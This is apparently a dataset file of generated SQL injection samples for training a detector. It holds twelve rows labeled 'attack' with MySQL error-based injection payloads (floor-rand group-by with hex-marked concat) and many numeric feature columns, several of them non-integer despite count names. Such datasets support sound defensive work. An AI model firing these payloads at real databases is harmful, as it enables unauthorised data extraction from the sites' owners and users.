id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000011,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,7.082557872560672,338.3089599609375,97.7445068359375,52.44498062133789,136.8191680908203,-13.087925910949707,123.7843017578125,37.519161224365234,0.44735443592071533,0.4237538278102875,0.13638269901275635,0.38287046551704407,0.10455002635717392,3.992870807647705,2.3676064014434814,2.0046770572662354,0.8242530226707458,0.21060459315776825,-0.03426021337509155,-0.48022329807281494,13.146604537963867,10.014632225036621,6.261744499206543,0.1732400506734848,2.0386972427368164,0.3356063663959503,-0.5911757946014404,0.2416139543056488,-0.1670481562614441,1.965221881866455,-0.1284637451171875,0.18978190422058105,0.7574809789657593,-0.19470377266407013,0.11058159172534943,2.668001651763916,6.707735061645508,0.700066089630127,4.78404426574707,1.5126235485076904,0.03488177806138992,1.0898528099060059,-0.40086880326271057,-0.07105764746665955,0.6132327318191528,0.7632414698600769,0.07832697033882141,0.2759782373905182,0.5400760173797607,0.45587867498397827,0.1787489652633667,-0.07268253713846207,-0.5470153093338013,0.3105678856372833,1.6357964277267456,0.233620285987854,0.3486230969429016,0.9375593662261963,-0.04139729216694832,0.13062740862369537,1.0838027000427246,0.596211850643158,-0.9104668498039246,0.019521847367286682,-0.07263249158859253,0.5844140648841858,0.2547912895679474,-0.9212601780891418,0.8286621570587158,-0.9243756532669067,-1.1927088499069214,-0.6184189915657043,-0.39224621653556824,-0.3867969512939453,-0.04257708415389061,-0.6641067862510681,1.7494608163833618,0.45780864357948303,0.034435469657182693,0.1377137154340744,1.141710638999939,8.506692886352539,0.8026233911514282,0.17903432250022888,0.16196852922439575,0.3850146234035492,0.3862822353839874,0.0927240252494812,0.9524534344673157
GAN_000012,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,7.67234203170128,322.2857666015625,89.27808380126953,44.96686935424805,127.94772338867188,-12.5259370803833,110.1856918334961,27.37348175048828,-0.04489588737487793,0.46447455883026123,0.11864085495471954,0.3743695616722107,0.10541149228811264,4.071325778961182,3.122192859649658,2.145993709564209,0.4853159487247467,0.27993613481521606,0.054330237209796906,-0.5139490365982056,12.835161209106445,7.228038311004639,6.589489459991455,0.2514841854572296,2.2168121337890625,0.1562231034040451,-0.7072198390960693,-0.47037699818611145,-0.12159759551286697,1.78249990940094,-0.6652136445045471,0.15118467807769775,1.2148360013961792,-0.31621086597442627,0.15521249175071716,2.694662094116211,4.058609485626221,1.1966552734375,4.704926490783691,1.9438049793243408,-0.21851149201393127,0.6735650897026062,-0.615755558013916,-0.07371725887060165,0.1923963725566864,0.921449601650238,0.614683985710144,-0.218900665640831,0.6134352087974548,-0.06145308539271355,0.021440913900732994,-0.4473749101161957,-0.5187298655509949,-0.07282400131225586,1.433179259300232,0.24218812584877014,0.42083483934402466,1.0360050201416016,-0.46722203493118286,0.39839428663253784,0.2955794036388397,0.5257868766784668,-1.1523891687393188,0.15132421255111694,-0.11614315211772919,0.9692479372024536,0.34504592418670654,-1.0175912380218506,1.1227362155914307,-0.9592183828353882,-1.7414411306381226,-0.9310472011566162,-0.3136698603630066,-0.6762707233428955,-0.04149021580815315,-0.5691134929656982,1.6732078790664673,0.7671736478805542,0.01028252113610506,0.01749163120985031,1.352623462677002,9.954286575317383,0.8513662815093994,0.001980361295863986,0.20416377484798431,0.3802797496318817,0.16913872957229614,-0.4057103395462036,0.9891374707221985
GAN_000013,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000042,6.050071044255603,325.61566162109375,82.86810302734375,53.046470642089844,139.08319091796875,-7.473902702331543,97.47808837890625,36.552608489990234,0.426743745803833,0.3728235960006714,0.15160588920116425,0.39545825123786926,0.11278434097766876,3.9032740592956543,2.392516851425171,1.7408859729766846,0.5368643999099731,0.20704211294651031,0.2948019206523895,-0.08907745033502579,11.583017349243164,11.340863227844238,6.204372406005859,0.47506171464920044,1.9731963872909546,0.327256977558136,-0.2066776305437088,0.08301907032728195,-0.006542943883687258,1.8945096731185913,-0.10394704341888428,0.32526910305023193,1.4920265674591064,-0.6459662318229675,0.3131828010082245,2.778700351715088,7.15147590637207,0.2916065752506256,5.180947303771973,1.52850341796875,0.10577548295259476,0.6594900488853455,-0.28126001358032227,-0.06715603172779083,0.5774037837982178,0.2051084041595459,-0.28139057755470276,0.32057735323905945,0.5049594044685364,0.5254457592964172,0.21265459060668945,0.097443126142025,-0.589366614818573,0.2547527551651001,1.2100473642349243,0.22316031157970428,0.23113182187080383,0.703445553779602,-0.013516802340745926,-0.01619260013103485,0.5250771641731262,0.6861182451248169,-0.8878553509712219,-0.11498451232910156,0.0014612540835514665,0.5733832716941833,0.32955610752105713,-0.6604931950569153,0.24367088079452515,-0.4622003138065338,-0.7959359288215637,-0.3567048907279968,-0.35591691732406616,-0.31215569376945496,-0.013159122318029404,-0.3791150152683258,1.4502487182617188,0.7478623986244202,-0.0892953872680664,0.1577044576406479,0.8583143949508667,10.322467803955078,0.91652512550354,0.23608887195587158,0.11554200202226639,0.49959009885787964,0.3610934317111969,-0.22242455184459686,0.34516745805740356
GAN_000014,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,6.580307622210494,314.3503112792969,99.3287582397461,54.685306549072266,138.05303955078125,-10.573922157287598,102.68050384521484,41.7874870300293,0.7323738932609558,0.37843480706214905,0.15225084125995636,0.4060456454753876,0.1090664193034172,3.8486459255218506,1.9249671697616577,1.5354255437850952,0.9566794633865356,0.20062889158725739,-0.1380385309457779,-0.016486242413520813,12.64130973815918,11.172662734985352,5.818346977233887,0.08633305877447128,1.9826174974441528,0.2409810721874237,-0.4882306754589081,0.1753349006175995,-0.19977381825447083,1.768370509147644,0.1355990469455719,0.19608014822006226,1.0341622829437256,-0.3042600750923157,0.2406773567199707,2.740421772003174,7.361414909362793,0.7152026891708374,4.802879810333252,0.8103951811790466,0.07371310144662857,0.873611330986023,-0.4757092595100403,-0.012943553738296032,0.7761697173118591,0.5168020129203796,-0.19046452641487122,0.3422233462333679,0.5273526310920715,0.5350795388221741,0.24153228104114532,0.0806938037276268,-0.5380202531814575,0.48725631833076477,1.427628993988037,0.20629191398620605,0.15269143879413605,1.0105555057525635,-0.14564694464206696,-0.05714140832424164,1.242897868156433,0.37099581956863403,-1.0073530673980713,-0.06369687616825104,-0.0014182556187734008,0.36991453170776367,0.3327558934688568,-1.0040208101272583,0.682504415512085,-0.6697559356689453,-0.8343948125839233,-0.5684108138084412,-0.1482892632484436,-0.5020785927772522,-0.026542071253061295,-0.11379220336675644,1.6687514781951904,0.6301279664039612,-0.03120666742324829,0.23027142882347107,0.8510193228721619,9.283604621887207,0.7902933359146118,0.1656273901462555,0.15049904584884644,0.287802129983902,0.4643901288509369,-0.08443467319011688,0.3411511480808258
GAN_000015,attack,error,"1'  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'wfws'  =  'wfws",nearest_attack_euclidean,R000046,5.9690918918718205,313.88067626953125,99.184814453125,41.38585662841797,122.01820373535156,-7.998586654663086,108.64994049072266,31.7198543548584,0.38429462909698486,0.42756253480911255,0.12221603095531464,0.3945133686065674,0.10984230041503906,3.967899799346924,2.366260051727295,1.3671106100082397,0.6226670145988464,0.21244920790195465,0.061113886535167694,-0.05467239394783974,11.809028625488281,9.049363136291504,6.270137786865234,0.26454097032546997,2.4870145320892334,0.2524372339248657,-0.5934709906578064,-0.061277199536561966,-0.02182856947183609,1.964984655380249,-0.17828193306922913,0.05778009071946144,1.6714086532592773,-0.524739682674408,0.21557943522930145,2.3134937286376953,5.297603607177734,1.0156939029693604,4.521462440490723,1.0945589542388916,0.04504639655351639,0.8969756960868835,-0.5586681365966797,-0.0335187204182148,0.3015914857387543,0.4374675750732422,0.04119003564119339,0.10067125409841537,0.5597487688064575,0.17888014018535614,0.0686989352107048,-0.07701391726732254,-0.4457382559776306,0.3808308243751526,1.3439605236053467,0.19632470607757568,0.1320921778678894,0.6200274229049683,-0.41135141253471375,-0.13400810956954956,0.38882195949554443,0.29811108112335205,-0.6857871413230896,-0.08713894337415695,-0.04219354689121246,0.21524332463741302,0.5542943477630615,-0.6756035089492798,1.0921921730041504,-0.5703757405281067,-1.07536780834198,-0.7427947521209717,0.22801579535007477,-0.5102114677429199,-0.026702534407377243,-0.3754333257675171,1.7722949981689453,0.5682691335678101,0.1324433535337448,0.04227355122566223,1.0011926889419556,10.31409740447998,0.8576685190200806,0.10435069352388382,0.1565130054950714,0.6062079071998596,-0.016845818608999252,0.02930566482245922,0.34188154339790344
GAN_000016,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,5.692330695503197,309.1445617675781,83.6939697265625,43.2628288269043,122.06321716308594,-7.360644340515137,84.39512634277344,34.527992248535156,0.638270914554596,0.3678962290287018,0.16407127678394318,0.3791143596172333,0.12593701481819153,3.9332282543182373,1.9270933866500854,1.3436640501022339,0.4493279457092285,0.21100442111492157,0.24472801387310028,-0.27385225892066956,10.46104621887207,8.991944313049316,5.021309852600098,0.14745338261127472,1.8691679239273071,0.10912207514047623,-0.2046685814857483,0.007759538013488054,-0.11678556352853775,1.1404823064804077,-0.1947188675403595,0.1295226663351059,1.4101150035858154,-0.3177143931388855,0.2048530876636505,2.5350773334503174,6.842924118041992,0.9114140868186951,3.768765926361084,1.1399776935577393,0.0760122612118721,0.7177648544311523,-0.30518314242362976,-0.05346043407917023,0.020113836973905563,0.5477377772331238,0.002482321113348007,0.3607715368270874,0.4927874505519867,0.4748961925506592,0.2423623949289322,0.1468334197998047,-0.28262650966644287,0.2554730772972107,1.016392707824707,0.116838239133358,0.2614091634750366,0.44860947132110596,-0.19378334283828735,0.026342839002609253,0.5680669546127319,0.2335054725408554,-0.5400624871253967,0.08057230710983276,-0.06421470642089844,0.4053466320037842,0.614667534828186,-0.6716228723526001,0.24786219000816345,-0.6592373251914978,-0.8714938759803772,-0.12265639007091522,-0.30055469274520874,-0.30163007974624634,-0.023581642657518387,-0.4441637098789215,1.2779541015625,0.6513370275497437,-0.26345399022102356,0.07389426231384277,0.7206058502197266,8.639627456665039,0.8407757878303528,0.03202132508158684,0.1036650538444519,0.3795981705188751,0.275335431098938,-0.2824040651321411,0.3774387836456299
GAN_000017,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.083304222560254,304.47564697265625,84.77694702148438,43.46937561035156,126.15643310546875,-6.526805877685547,75.73841857910156,36.49980545043945,0.6389404535293579,0.36433419585227966,0.1614324301481247,0.3847576677799225,0.12851038575172424,3.918377637863159,1.7587846517562866,1.0802940130233765,0.4334472715854645,0.3243372142314911,0.1339849978685379,-0.24553470313549042,10.460850715637207,8.375299453735352,4.8864030838012695,0.14714139699935913,1.9679038524627686,0.004169967491179705,-0.11793725192546844,-0.22411476075649261,-0.2279055118560791,1.2842514514923096,-0.2751238942146301,0.23523247241973877,1.4728145599365234,-0.40866976976394653,0.25866052508354187,2.5684680938720703,6.352057456970215,0.9358917474746704,3.829252243041992,1.2139310836791992,0.030690379440784454,0.36828967928886414,-0.41483667492866516,-0.020816003903746605,0.1080656424164772,0.3018162250518799,0.12912233173847198,0.311258465051651,0.46753716468811035,0.39555108547210693,0.25880157947540283,0.09002199023962021,-0.2728164792060852,0.2671511471271515,0.9946809411048889,0.17072443664073944,0.22729378938674927,0.7144368886947632,-0.5355388522148132,-0.008240741677582264,0.6426340341567993,0.221014142036438,-0.797217071056366,0.3190552294254303,-0.01898445002734661,0.33216869831085205,0.5871152877807617,-0.6859888434410095,0.3815816342830658,-0.823033332824707,-0.8855512738227844,-0.05028705671429634,-0.02269821986556053,-0.40254318714141846,-0.02235727198421955,-0.18562543392181396,1.1661732196807861,0.8906266689300537,-0.231358140707016,0.054887667298316956,0.8373021483421326,9.479251861572266,0.763042688369751,0.0009117244626395404,0.1048063114285469,0.33269453048706055,0.4434169828891754,-0.5807978510856628,0.13269197940826416
GAN_000018,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.3331663011765205,308.2359619140625,84.52297973632812,42.95372772216797,121.8512954711914,-6.6605987548828125,103.01052856445312,30.614734649658203,0.4692368507385254,0.39828798174858093,0.15009759366512299,0.3928595185279846,0.12155590206384659,3.8404273986816406,2.4589738845825195,1.5774468183517456,0.6902427077293396,0.21167682111263275,0.1806965321302414,0.013277282938361168,10.959378242492676,8.4061861038208,6.173736095428467,0.1712876260280609,2.167975664138794,0.10506398230791092,-0.4639722406864166,-0.14672987163066864,-0.16904151439666748,1.3278050422668457,-0.3563816249370575,-0.04811146482825279,1.5225406885147095,-0.6498662829399109,0.2006772756576538,2.607154369354248,5.804144382476807,0.7529076933860779,3.961613416671753,1.8297178745269775,-0.03434329479932785,0.9479531049728394,-0.5119704604148865,-0.04346899688243866,-0.09388084709644318,0.554524302482605,0.08384457230567932,0.14669592678546906,0.6024363040924072,0.20725767314434052,0.16201327741146088,-0.015245954506099224,-0.8460969924926758,0.03327685967087746,1.1948869228363037,0.19234918057918549,0.2400984764099121,1.0295785665512085,-0.3636224567890167,-0.017236091196537018,0.41460978984832764,0.5087355375289917,-0.8218849897384644,-0.26913881301879883,-0.1007443517446518,0.5174726247787476,0.5283300280570984,-0.882465124130249,0.5921351313591003,-0.7446648478507996,-1.2509477138519287,-0.4206863343715668,-0.2147105634212494,-0.7545283436775208,-0.017505966126918793,-0.5525556802749634,1.380157470703125,0.6565811038017273,0.07218914479017258,0.07110545039176941,1.0631401538848877,9.172931671142578,0.7642632722854614,-0.06345489621162415,0.1879168152809143,0.46381378173828125,0.11354054510593414,-0.34215059876441956,0.3853558301925659
GAN_000019,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,6.72087950954964,298.74713134765625,94.10498809814453,42.83040237426758,115.98241424560547,-13.6387357711792,107.9200210571289,28.091249465942383,0.015393197536468506,0.4306716024875641,0.12977765500545502,0.37367844581604004,0.11333567649126053,4.007544994354248,2.8688695430755615,1.814449429512024,0.671726644039154,0.19030879437923431,0.28526753187179565,-0.4218088686466217,11.875770568847656,6.322157382965088,6.715684413909912,0.32288309931755066,2.3151328563690186,0.05815769359469414,-0.6600799560546875,-0.2827136516571045,-0.09913452714681625,1.604882836341858,-0.6591275930404663,-0.128548264503479,1.5673243999481201,-0.36479249596595764,0.14875207841396332,2.646008014678955,5.093425750732422,1.3187936544418335,4.029628753662109,1.8183794021606445,-0.2249685823917389,0.9136679172515869,-0.6641247272491455,-0.06445271521806717,-0.1953851282596588,0.9655070304870605,0.34336844086647034,-0.00026140609406866133,0.6436644792556763,-0.03142009302973747,0.07302337139844894,-0.2879749834537506,-0.2821556031703949,0.05233943089842796,1.310471534729004,0.14566247165203094,0.3096993863582611,0.8414576649665833,-0.5546091794967651,0.4166850447654724,0.24381540715694427,0.29656127095222473,-0.8938174843788147,-0.08852790296077728,-0.1327246129512787,0.6402355432510376,0.47207361459732056,-0.8652282357215881,0.981116771697998,-0.8276160359382629,-1.4199455976486206,-0.6022918820381165,-0.2139812856912613,-0.610685408115387,-0.03577635809779167,-0.5875969529151917,1.7203818559646606,0.705479085445404,0.11886396259069443,0.12244144827127457,1.17415452003479,8.061127662658691,0.8369335532188416,-0.09584003686904907,0.16976037621498108,0.4175058901309967,-0.07769666612148285,-0.2820969223976135,0.7033692598342896
GAN_000020,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,5.899799078826662,306.96124267578125,88.49774169921875,42.36821365356445,121.67338562011719,-9.46635913848877,93.137939453125,32.459896087646484,0.604180097579956,0.39204636216163635,0.15354812145233154,0.3826450705528259,0.12186688929796219,3.918647289276123,1.7946245670318604,1.3196204900741577,0.7156314253807068,0.26716551184654236,0.23277832567691803,-0.276790052652359,10.638622283935547,8.35157585144043,5.08998966217041,0.13622482120990753,2.079364061355591,0.08957496285438538,-0.34249579906463623,-0.11090771853923798,-0.14523419737815857,1.3671027421951294,-0.05104721710085869,0.05336819961667061,1.420094609260559,-0.31944021582603455,0.16089558601379395,2.4786596298217773,6.019305229187012,0.9589845538139343,3.902634859085083,1.3989404439926147,-0.025499098002910614,0.8447445631027222,-0.38505473732948303,-0.020410558208823204,-0.006785091012716293,0.8379815816879272,-0.09090033173561096,0.2773526906967163,0.5082973837852478,0.34929144382476807,0.19636748731136322,-0.08900357037782669,-0.33358317613601685,0.3528704047203064,1.1384506225585938,0.11038224399089813,0.2823029160499573,0.7251054048538208,-0.46196240186691284,-0.10566600412130356,0.6765968203544617,0.3315798044204712,-0.5222921967506409,-0.010073669254779816,-0.09444817155599594,0.3715496361255646,0.5459688901901245,-0.8346101641654968,0.5939537286758423,-0.8030205368995667,-1.108165979385376,-0.3665827512741089,-0.26995405554771423,-0.5956903696060181,-0.02341696433722973,-0.38859206438064575,1.472821593284607,0.7004614472389221,-0.22992447018623352,0.11660531163215637,0.9293744564056396,8.612217903137207,0.9230244755744934,-0.03773282840847969,0.1354483813047409,0.34456631541252136,0.3941437005996704,-0.17833273112773895,0.31399524211883545
GAN_000021,attack,error,"1   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  8382  =  8382",nearest_attack_euclidean,R000104,5.97311307573108,328.29510498046875,94.23596954345703,48.95734786987305,136.27212524414062,-5.606783866882324,98.93670654296875,35.34263229370117,0.5469951629638672,0.3831319510936737,0.1461469531059265,0.38406071066856384,0.11482863873243332,3.942613363265991,2.4122872352600098,1.3578792810440063,0.7947321534156799,0.22524189949035645,0.24118536710739136,-0.322831928730011,11.7931547164917,10.32796859741211,5.925985336303711,0.23422372341156006,2.2432267665863037,0.24603641033172607,-0.40161430835723877,0.12022612243890762,-0.0517299547791481,1.821873664855957,-0.05898970738053322,0.08003778755664825,1.1902350187301636,-0.17739015817642212,0.3519955277442932,2.549476385116577,7.100463390350342,0.651868999004364,4.664209842681885,1.3831562995910645,0.08628643304109573,0.6968433260917664,-0.2514854669570923,-0.06072933226823807,0.4525821805000305,0.43152132630348206,-0.20379604399204254,0.3065733015537262,0.572654128074646,0.4629265367984772,0.27373605966567993,0.18925368785858154,-0.4178675413131714,0.3929704427719116,1.242270827293396,0.13548612594604492,0.29333195090293884,0.534021258354187,-0.09022693336009979,-0.1610357165336609,0.5895634293556213,0.544132649898529,-0.7806847095489502,-0.1484140008687973,-0.014730235561728477,0.38262635469436646,0.4678175449371338,-0.7690929174423218,0.5784195065498352,-0.47277331352233887,-0.9557744860649109,-0.32305872440338135,-0.06512778997421265,-0.3543720245361328,-0.01229567639529705,-0.5258344411849976,1.6190152168273926,0.5458883047103882,0.14667846262454987,0.10740355402231216,1.0285305976867676,9.647655487060547,0.6995318531990051,0.23427505791187286,0.09903201460838318,0.4324244558811188,0.36222437024116516,0.05765695124864578,0.4678666889667511
GAN_000022,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000133,6.423706651684519,322.539306640625,82.73332977294922,52.14019012451172,136.3647003173828,-5.49660587310791,98.94529724121094,35.07794952392578,0.46914124488830566,0.39245542883872986,0.13727518916130066,0.3938579261302948,0.10766617208719254,3.872084617614746,2.5078349113464355,2.0630226135253906,0.557503342628479,0.300045907497406,0.07929646223783493,-0.4533906579017639,12.18566608428955,10.753768920898438,6.182805061340332,0.386940062046051,2.1367743015289307,0.3497864902019501,-0.2863515615463257,0.06336836516857147,0.021690301597118378,2.0954930782318115,-0.30776283144950867,0.20719094574451447,1.3558844327926636,-0.5523546934127808,0.40453171730041504,2.773503541946411,6.503837585449219,0.5904036164283752,5.322856426239014,1.4636728763580322,0.1253964900970459,0.5125470757484436,-0.13248339295387268,-0.062470175325870514,0.46421414613723755,0.13042746484279633,0.01065794937312603,0.2531605064868927,0.6295682191848755,0.400646448135376,0.1575033962726593,0.14682836830615997,-0.6615410447120667,0.09466081857681274,1.1534439325332642,0.27718213200569153,0.2078278511762619,0.7585254311561584,-0.002703823149204254,-0.1374954730272293,0.5076775550842285,0.825525164604187,-0.9861513376235962,0.24825720489025116,0.0014073696220293641,0.5705908536911011,0.3453667461872101,-0.8455109596252441,0.4593546986579895,-0.665115475654602,-0.8468502163887024,-0.48198050260543823,-0.048621706664562225,-0.3211831748485565,-0.012094700708985329,-0.6258975267410278,1.4303392171859741,0.6046082377433777,0.11474249511957169,0.1019100770354271,1.0975077152252197,10.61976432800293,0.6619035601615906,0.2510347366333008,0.12271615117788315,0.5883551239967346,0.21324452757835388,-0.35564619302749634,0.6364008784294128
